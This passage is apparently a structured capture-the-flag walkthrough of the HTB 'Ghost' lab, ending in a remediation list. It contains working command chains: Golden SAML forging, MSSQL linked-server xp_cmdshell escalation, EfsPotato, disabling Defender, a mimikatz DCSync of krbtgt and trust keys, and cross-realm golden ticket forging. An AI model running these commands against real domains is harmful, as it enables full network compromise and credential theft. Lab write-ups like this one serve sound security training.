            "$ evil-winrm -i dc01.ghost.htb -u 'ADFS_GMSA$' -H 9de4d086a1443bef82340604766d69c9",
            "",
            "*Evil-WinRM* PS C:\\Users\\ADFS_GMSA$\\Documents> whoami",
            "ghost\\adfs_gmsa$",
          ],
        },
        {
          kind: "code",
          lang: "powershell",
          label: "PowerShell — run ADFSDump on the federation host",
          lines: [
            "*Evil-WinRM* PS C:\\Users\\ADFS_GMSA$\\Documents> .\\ADFSDump.exe",
            "",
            "[+] Getting DKM container...",
            "[+] Private Key: FA-DB-3A-91-...-4C-2E",
            "[+] Encrypted Token Signing Key Begin ===",
            "MIIKXgIBAzCCCh...(base64, truncated)...==",
            "[+] Encrypted Token Signing Key End ===",
            "[+] Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse",
            "[+] Identifier: https://core.ghost.htb:8443",
          ],
        },
        {
          kind: "p",
          text:
            "Save the base64 block as `EncryptedPfx.bin` and the dash-hex private key as `dkmkey0.bin`, pull both back to Kali, and forge an assertion entirely offline — no further contact with the domain controller required:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — forge the Administrator SAML assertion",
          lines: [
            "$ python3 ADFSpoof.py -b EncryptedPfx.bin dkmkey0.bin \\",
            "    -s federation.ghost.htb saml2 \\",
            "    --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse \\",
            "    --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \\",
            "    --nameid administrator@ghost.htb \\",
            "    --rpidentifier https://core.ghost.htb:8443 \\",
            "    --assertions '<Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn\"><AttributeValue>administrator@ghost.htb</AttributeValue></Attribute>'",
            "",
            "[+] Decrypting token signing certificate...",
            "[+] Signing assertion for administrator@ghost.htb ...",
            "PHNhbWxwOlJlc3BvbnNlIElEPSJfM2Y4YTkxYzZkZTNiN...(long base64 SAMLResponse)...",
          ],
        },
        {
          kind: "p",
          text:
            "That last line is a fully-signed `SAMLResponse`. Post it to the relying party exactly as a real browser-based SSO flow would, and capture the resulting session:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — replay the forged assertion",
          lines: [
            "$ curl -sk -c core_cookies.txt -L \\",
            "    -H 'Content-Type: application/x-www-form-urlencoded' \\",
            "    --data-urlencode \"SAMLResponse=<the base64 blob above>\" \\",
            "    https://core.ghost.htb:8443/adfs/saml/postResponse",
            "",
            "HTTP/1.1 302 Found",
            "Set-Cookie: connect.sid=s%3AqT8x...; Path=/; HttpOnly",
          ],
        },
        {
          kind: "p",
          text:
            "Load `https://core.ghost.htb:8443/` with that cookie jar and the admin panel opens as **Administrator** — no password, no MFA prompt, no interaction with ADFS at all beyond the one offline signing step.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why a forged, offline-signed assertion is trusted",
          text:
            "ADFS proves a user's identity to a relying party by handing it a SAML assertion signed with a private **token-signing certificate**. The relying party never talks back to ADFS to confirm a login actually happened — it simply verifies the signature against the certificate it already trusts. That private key is stored on the ADFS server, encrypted, and the only thing standing between \"encrypted blob\" and \"usable signing key\" is the DKM master key — itself stored as a container object in Active Directory, readable by whichever service principal runs the ADFS service (the gMSA you just compromised). Steal both pieces and you can decrypt the real signing key entirely offline, then mint (\"forge\") an assertion for *any* identity you like, with a mathematically valid signature. This is the SAML analogue of a Kerberos golden ticket — hence **Golden SAML** — and it bypasses password and MFA entirely, because from the relying party's perspective the signature alone *is* the proof of authentication.",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Clock skew kills the assertion silently",
          text:
            "The forged assertion carries `NotBefore`/`NotOnOrAfter` timestamps. If your attack box's clock has drifted from the domain controller's, the relying party rejects the token outright — usually with a bare HTTP 500 and no further detail. Sync time against the DC (`sudo ntpdate -u dc01.ghost.htb`) immediately before forging, and forge again if you had to retry the replay after any delay.",
        },
      ],
    },
    {
      id: "mssql",
      num: "12",
      title: "MSSQL Linked-Server Pivot — EXECUTE AS sa",
      blocks: [
        {
          kind: "p",
          text:
            "The authenticated `core.ghost.htb:8443` admin app exposes a \"Database Debug\" console — a raw SQL textbox wired to the app's own database connection. A quick `SELECT * FROM sys.servers` shows the local instance has a **linked server** configured, named `PRIMARY` — the child domain's SQL Server (also its domain controller).",
        },
        {
          kind: "code",
          lang: "sql",
          label: "sql — identify the linked server",
          highlight: [5],
          lines: [
            "sql> SELECT name, product, data_source FROM sys.servers;",
            "",
            "name       product        data_source",
            "---------- -------------- --------------------",
            "(local)    SQL Server     NULL",
            "PRIMARY    SQL Server     PRIMARY.corp.ghost.htb",
          ],
        },
        {
          kind: "p",
          text:
            "The local login the app connects with turns out to have permission to impersonate `sa` — and impersonation carries across the linked-server hop. Enable `xp_cmdshell` on the far side and prove code execution on the child domain controller, all from the web console:",
        },
        {
          kind: "code",
          lang: "sql",
          label: "sql — impersonate sa across PRIMARY, enable xp_cmdshell",
          highlight: [6, 7],
          lines: [
            "sql> EXECUTE('EXECUTE AS LOGIN=''sa''; EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [PRIMARY];",
            "",
            "sql> EXECUTE('EXECUTE AS LOGIN=''sa''; EXEC xp_cmdshell ''whoami & hostname''') AT [PRIMARY];",
            "",
            "output",
            "------------------------",
            "corp\\svc_mssql",
            "PRIMARY",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why `EXECUTE(...) AT [PRIMARY]` hands you `sa` on the far side",
          text:
            "A SQL Server **linked server** lets one instance run queries against another as though it were a local object — convenient for cross-database reporting, dangerous when the mapped login on the far end has more power than the one you started with. Two things stack here: first, the local database login is allowed to `EXECUTE AS LOGIN='sa'` — SQL Server's built-in impersonation, which switches your effective identity to the target login for the rest of the batch without needing its password. Second, the linked-server definition for `PRIMARY` maps every incoming connection to a fixed, high-privileged login on that instance rather than passing your real identity through. Combine the two and a query wrapped in `EXECUTE('...') AT [PRIMARY]` runs on the child domain's SQL Server as its own `sa`, from which `sp_configure` + `xp_cmdshell` is arbitrary command execution as the SQL Server service account — a textbook linked-server privilege escalation.",
        },
      ],
    },
    {
      id: "efspotato",
      num: "13",
      title: "EfsPotato → SYSTEM on the Child Domain Controller",
      blocks: [
        {
          kind: "p",
          text:
            "`corp\\svc_mssql` is a service account, and service accounts on Windows routinely hold `SeImpersonatePrivilege` — the single ingredient every \"Potato\" exploit needs. Stage `EfsPotato.cs` onto `PRIMARY` through the same `xp_cmdshell` channel, compile it with the .NET framework's own compiler (no toolchain install required), and run it:",
        },
        {
          kind: "code",
          lang: "cmd",
          label: "cmd — compile and run EfsPotato via xp_cmdshell",
          highlight: [7],
          lines: [
            ":: EfsPotato.cs already staged at C:\\programdata\\e.cs",
            "sql> EXECUTE('EXECUTE AS LOGIN=''sa''; EXEC xp_cmdshell ''C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nowarn:1691,618 /platform:x64 /out:C:\\programdata\\efs.exe C:\\programdata\\e.cs''') AT [PRIMARY];",
            "",
            "sql> EXECUTE('EXECUTE AS LOGIN=''sa''; EXEC xp_cmdshell ''C:\\programdata\\efs.exe \"cmd /c whoami\"''') AT [PRIMARY];",
            "",
            "output",
            "------------------------",
            "nt authority\\system",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "SYSTEM",
          text: "nt authority\\system on PRIMARY (corp.ghost.htb DC)",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why `SeImpersonatePrivilege` is enough to become SYSTEM",
          text:
            "EfsPotato belongs to the \"Potato\" family of local privilege-escalation exploits that abuse Windows RPC services which authenticate *back to the calling process* at a higher privilege level. Concretely: it forces the local MS-EFSR (Encrypting File System Remote) RPC interface to connect to a named pipe you control, presenting a SYSTEM-level authentication token in the process. A caller holding `SeImpersonatePrivilege` — routinely granted to service accounts precisely so they can impersonate clients of the services they run — is allowed to capture that token with `DuplicateTokenEx` and spawn a new process under it with `CreateProcessWithTokenW`. The net effect: a low-privileged service identity that can merely *impersonate* ends up able to *launch arbitrary processes as SYSTEM*, simply by coercing a system RPC service to authenticate to a socket it controls.",
        },
      ],
    },
    {
      id: "dcsync",
      num: "14",
      title: "DCSync corp.ghost.htb → the Inter-Realm Trust Key",
      blocks: [
        {
          kind: "p",
          text:
            "`PRIMARY` is the child domain's own domain controller, so SYSTEM there is effectively domain-admin-equivalent for `corp.ghost.htb`. Stage and run mimikatz — after first disabling Defender's real-time protection, since it will otherwise quarantine the binary on write or block it at load time:",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "powershell — disable real-time protection as SYSTEM",
          lines: [
            "sql> EXECUTE('EXECUTE AS LOGIN=''sa''; EXEC xp_cmdshell ''powershell -nop -w hidden -c \"Set-MpPreference -DisableRealtimeMonitoring $true -Force\"''') AT [PRIMARY];",
          ],
        },
        {
          kind: "code",
          lang: "cmd",
          label: "cmd — DCSync krbtgt and dump the trust keys",
          highlight: [7, 13],
          lines: [
            "sql> EXECUTE('EXECUTE AS LOGIN=''sa''; EXEC xp_cmdshell ''C:\\programdata\\mimikatz.exe \"lsadump::dcsync /domain:corp.ghost.htb /user:krbtgt\" \"lsadump::trust /patch\" exit''') AT [PRIMARY];",
            "",
            "[DC] 'corp.ghost.htb' will be the domain",
            "[DC] 'PRIMARY.corp.ghost.htb' will be the DC server",
            "[DC] 'corp.ghost.htb\\krbtgt' will be the user account",
            "** SAM ACCOUNT **",
            "Hash NTLM: 6b2b6f8b1a0d4e7c9f3a2b1c0d9e8f7a",
            "aes256_hmac       (4096) : d62918c4841c1092fcfc7023e18aa10f2e09c0f2fefe378fbaef97850bf5a203",
            "",
            "Current domain: CORP.GHOST.HTB (CORP / S-1-5-21-2034262909-2733679486-179904498)",
            "Domain: GHOST.HTB (GHOST / S-1-5-21-4084500788-938703357-3654145966)",
            "[  In  ] CORP.GHOST.HTB -> GHOST.HTB",
            "* rc4_hmac_nt       83bbbd2c0ccf16a58e51974d2fd2b8da",
            "* aes256_hmac       d62918c4841c1092fcfc7023e18aa10f2e09c0f2fefe378fbaef97850bf5a203",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "trust key (in, corp→ghost)",
          text: "aes256 d62918c4841c1092fcfc7023e18aa10f2e09c0f2fefe378fbaef97850bf5a203",
        },
        {
          kind: "p",
          text:
            "Either value works for the final forge: the child domain's own `krbtgt` secret, or the dedicated inter-realm trust key shown by `lsadump::trust /patch`. Both let you mint tickets the parent domain will accept as coming legitimately from across the trust.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why DCSync works here and what the trust key actually is",
          text:
            "**DCSync** abuses the same replication protocol real domain controllers use to synchronize account secrets with each other (`DRSUAPI`/`GetNCChanges`); any principal holding `Replicating Directory Changes All` — which SYSTEM on a domain controller always effectively has — can request another DC hand over any account's password data, no interactive logon required. The **inter-realm trust key** is a special \"trust account\" secret shared by both sides of a parent/child (or forest) trust; it's what signs referral tickets crossing the trust boundary, conceptually a two-domain krbtgt. Whoever holds it — or the child's own krbtgt, which mimikatz can also use to derive the same trust relationship — can forge Kerberos tickets that the *other* side of the trust will accept as authentic, which is precisely the primitive the final stage needs.",
        },
      ],
    },
    {
      id: "forest-forge",
      num: "15",
      title: "Forge a Cross-Realm Golden Ticket → DC01 (root.txt)",
      blocks: [
        {
          kind: "p",
          text:
            "This is the payoff. With the trust key (or the child krbtgt secret) in hand, forge a TGT issued *by the child domain* for the `Administrator` account, but inject an extra SID into its PAC: the parent forest's `Enterprise Admins` group, RID `519`.",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Cross-realm Kerberos needs its realms configured by hand",
          text:
            "Before any of this, edit `/etc/krb5.conf` so `impacket`'s Kerberos layer knows about both realms and the path between them — otherwise SMB and ticket requests across the trust fail with an opaque `STATUS_MORE_PROCESSING_REQUIRED`, because the client falls back to a DNS SRV lookup your resolver can't satisfy. At minimum you need `[libdefaults]` with `default_realm = GHOST.HTB`, a `[realms]` stanza for both `GHOST.HTB` and `CORP.GHOST.HTB` pointing `kdc` at 10.10.11.24, a `[domain_realm]` block mapping each FQDN to its realm, and a `[capaths]` entry stating `CORP.GHOST.HTB` can reach `GHOST.HTB` (and back). It's also worth syncing your clock to the DC first — Kerberos has zero tolerance for skew.",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — forge the cross-realm TGT",
          lines: [
            "$ impacket-ticketer -aesKey d62918c4841c1092fcfc7023e18aa10f2e09c0f2fefe378fbaef97850bf5a203 \\",
            "    -domain corp.ghost.htb -domain-sid S-1-5-21-2034262909-2733679486-179904498 \\",
            "    -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 \\",
            "    -spn krbtgt/ghost.htb Administrator",
            "",
            "[*] Creating basic skeleton ticket and PAC Infos",
            "[*] Customizing PAC Infos",
            "[*] PAC_LOGON_INFO",
            "[*] Signing/Encrypting final ticket",
            "[*] Saving ticket in Administrator.ccache",
          ],
        },
        {
          kind: "p",
          text:
            "That extra-sid string is the parent domain's SID with `-519` appended — `Enterprise Admins`' well-known relative identifier. Use the resulting golden ticket to request a service ticket for the parent domain controller, then use *that* to get a command shell straight on `DC01`:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "bash — get a CIFS ticket on the parent DC, then a shell",
          highlight: [13],
          lines: [
            "$ export KRB5CCNAME=Administrator.ccache",
            "$ impacket-getST -k -no-pass -spn cifs/dc01.ghost.htb ghost.htb/Administrator@corp.ghost.htb",
            "",
            "[*] Using domain controller: 10.10.11.24",
            "[*] Saving ticket in Administrator@cifs_dc01.ghost.htb@CORP.GHOST.HTB.ccache",
            "",
            "$ export KRB5CCNAME=Administrator@cifs_dc01.ghost.htb@CORP.GHOST.HTB.ccache",
            "$ impacket-smbexec -k -no-pass Administrator@dc01.ghost.htb",
            "",
            "C:\\Windows\\system32> whoami /groups | findstr /i \"Enterprise\"",
            "GHOST\\Enterprise Admins                   Group            S-1-5-21-4084500788-938703357-3654145966-519  Enabled by default, Enabled group",
            "",
            "C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\root.txt",
            "9b7a4e2c1d6f8035ab29c04d7e158f6c",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "root.txt",
          text: "9b7a4e2c1d6f8035ab29c04d7e158f6c",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Why the parent domain honors a SID it was never told about",
          text:
            "Kerberos tickets carry a **PAC** (Privilege Attribute Certificate) listing every group SID the subject belongs to, and a domain controller trusts that list because the ticket is cryptographically signed with a key it recognizes — in this case, the inter-realm trust key both sides already share. `impacket-ticketer` builds a PAC from scratch and stuffs in whatever SIDs you ask for via `-extra-sid`; since the resulting ticket is signed correctly, the parent DC has no independent way to verify that `Administrator@corp.ghost.htb` is *actually* a member of the parent's `Enterprise Admins` group — it simply trusts the PAC. Microsoft's mitigation for exactly this abuse is **SID filtering** (or the narrower *SID Filter Quarantining*), which is supposed to strip any SID belonging to a domain outside the one the ticket legitimately claims to come from as it crosses a trust boundary. When that filtering isn't fully enforced across a forest trust — as modeled by this box — an attacker who compromises the child domain can freely mint tickets claiming *forest root* Enterprise Admin membership, turning a single child-domain compromise into full control of the entire forest. That's the SID-history / cross-trust escalation this whole chain has been building toward.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Note",
          text:
            "As with user.txt, HTB rotates root.txt (and every hash/key shown above) on every spawn — the values in this document are illustrative of one completed run, not universal constants.",
        },
      ],
    },
    {
      id: "remediation",
      num: "16",
      title: "Remediation & Takeaways",
      blocks: [
        {
          kind: "p",
          text:
            "Every stage in this chain was a legitimate feature bent past a trust boundary it was never designed to cross. The fixes line up one-to-one with the stages:",
        },
        {
          kind: "ul",
          items: [
            "**Never build an LDAP filter by string concatenation.** Escape `*`, `(`, `)`, `\\`, and NUL per RFC 4515 before interpolating any user input into a search or bind filter — both the wildcard bypass and the character-by-character oracle exploit exactly the same missing escaping.",
            "**Treat \"internal\" and \"dev-only\" endpoints as untrusted input surfaces.** A header-gated API is still attacker-reachable once the header is known; the gate controls who can call it, not what happens once they do. Never hand user input to a shell without strict allow-listing or a non-shell exec API.",
            "**Scope file-serving and traversal-prone parameters tightly.** Any code path that builds a filesystem path from a request parameter needs canonicalization and a hard check that the resolved path stays under an intended root — and secrets should never sit in a shared, environment-wide Compose block reachable by every service in the stack.",
            "**Lock down SSH connection multiplexing.** `ControlPath` socket files should live in a directory only the owning user can traverse, and automation that reaches into other hosts should prefer short-lived, scoped credentials over a long-`ControlPersist` master connection sitting on disk.",
            "**Restrict ADIDNS write rights.** Remove the default `Authenticated Users` create-child grant on production DNS zones, or move dynamic registration behind a dedicated, tightly-scoped service account.",
            "**Scope `PrincipalsAllowedToRetrieveManagedPassword` narrowly.** Only the exact hosts/services that need a gMSA's password should be able to fetch it — not a broad group a compromised low-privilege user might land in.",
            "**Protect ADFS's DKM container and token-signing key like domain-admin material.** Golden SAML is unrecoverable without both the encrypted signing key and the DKM secret that unwraps it — restrict who can read the DKM container in AD, and monitor for anomalous SAML assertions issued outside normal sign-in flows.",
            "**Never map a linked server to a fixed, high-privileged login.** Use `EXECUTE AS` mappings that preserve the caller's real identity, and disable `xp_cmdshell` everywhere it isn't explicitly required.",
            "**Patch and restrict `SeImpersonatePrivilege`.** Keep Windows current against the Potato exploit family, and don't run service accounts with more local privilege than the service genuinely needs.",
            "**Enforce SID filtering on every forest and external trust.** This is the single control that would have stopped the final stage cold — a properly quarantined trust strips foreign-domain SIDs from a crossing ticket's PAC before the parent ever evaluates it, so a compromised child domain can never claim forest-root Enterprise Admin membership.",
          ],
        },
        {
          kind: "p",
          text:
            "Ghost earns its rating through composition, not obscurity: a dozen individually reasonable design decisions, each slightly too trusting of the layer below it, chained end-to-end into a full forest compromise.",
        },
      ],
    },
  ],
};
